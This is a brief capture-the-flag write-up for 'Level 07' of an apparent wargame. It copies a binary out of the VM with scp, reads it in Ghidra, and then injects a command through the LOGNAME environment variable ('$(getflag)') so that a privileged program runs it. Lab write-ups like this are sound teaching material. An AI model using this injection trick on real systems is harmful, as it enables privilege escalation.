# Level 07

We'll get `level07` on our local machine to decomplie it with ***Ghidra***.
>`scp -P 4242 level07@<VM address>:level07 .`


The program executes `echo` with env variable `LOGNAME` as parameter. We'll overide this variable to get the flag.
>`export LOGNAME="$(getflag)"`

> `./level07`
